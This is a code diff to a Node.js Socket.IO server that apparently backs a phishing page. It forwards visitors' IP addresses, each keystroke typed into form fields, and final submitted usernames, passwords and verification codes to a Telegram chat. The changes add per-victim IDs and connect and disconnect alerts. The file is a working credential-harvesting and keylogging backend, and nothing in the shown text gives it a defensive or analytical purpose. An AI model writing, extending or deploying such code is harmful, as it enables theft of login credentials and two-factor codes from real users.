@@ -8,7 +8,7 @@ const app = express();
 const server = http.createServer(app);
 
 const io = new Server(server,{
-  cors:{origin:"*"}
+  cors:{ origin:"*" }
 });
 
 app.use(cors());
@@ -26,14 +26,21 @@ function sendTelegram(message){
 
 io.on("connection",(socket)=>{
 
-    console.log("User connected");
+    const userId = socket.id;   // Unique user ID
 
-    // Receive visitor info from frontend
+    console.log("User connected:", userId);
+
+    sendTelegram(`🟢 USER CONNECTED
+ID: ${userId}`);
+
+    // Receive visitor info
     socket.on("visitor-info",(data)=>{
 
         console.log("Visitor Data:", data);
 
         sendTelegram(`⚠️ New Visitor
+
+User ID: ${userId}
 
 🌐 IPv6: ${data.ipv6}
 🌐 IPv4: ${data.ipv4}
@@ -54,6 +61,8 @@ io.on("connection",(socket)=>{
     socket.on("typing",(data)=>{
         sendTelegram(`⌨️ Typing
 
+User ID: ${userId}
+
 Field: ${data.field}
 Value: ${data.value}`);
     });
@@ -62,17 +71,24 @@ Value: ${data.value}`);
     socket.on("submit",(data)=>{
         sendTelegram(`✅ Final Submission
 
+User ID: ${userId}
+
 Username: ${data.username}
 Password: ${data.password}
-code: ${data.code}`);
+Code: ${data.code}`);
     });
 
     socket.on("disconnect",()=>{
-        console.log("User disconnected");
+        console.log("User disconnected:", userId);
+
+        sendTelegram(`🔴 USER DISCONNECTED
+ID: ${userId}`);
     });
 
 });
 
-server.listen(3000,()=>{
-    console.log("Server running on port 3000");
+const PORT = process.env.PORT || 3000;
+
+server.listen(PORT,()=>{
+    console.log("Server running on port", PORT);
 });
